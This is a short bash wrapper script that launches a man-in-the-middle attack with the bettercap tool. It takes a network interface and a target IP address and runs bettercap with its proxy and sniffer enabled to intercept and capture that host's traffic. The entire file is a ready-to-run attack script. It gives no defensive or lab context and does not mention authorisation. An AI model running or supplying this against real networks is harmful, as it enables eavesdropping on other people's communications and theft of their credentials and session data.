#!/bin/bash
# Bettercap - Man-in-the-Middle Attack
# Options:
# -I : Interface to use
# -T : Target IP address

# Usage: bettercap_mitm.sh <interface> <target_ip>
# Example script
# bettercap_mitm.sh eth0 192.168.1.10

# Check if bettercap is installed
if ! command -v bettercap &> /dev/null
then
    echo "bettercap could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <interface> <target_ip>"
    exit 1
fi

INTERFACE=$1
TARGET_IP=$2

echo "Starting MITM attack on interface $INTERFACE targeting $TARGET_IP"

# Perform MITM attack
bettercap -I $INTERFACE -T $TARGET_IP --proxy --sniffer

echo "MITM attack completed."
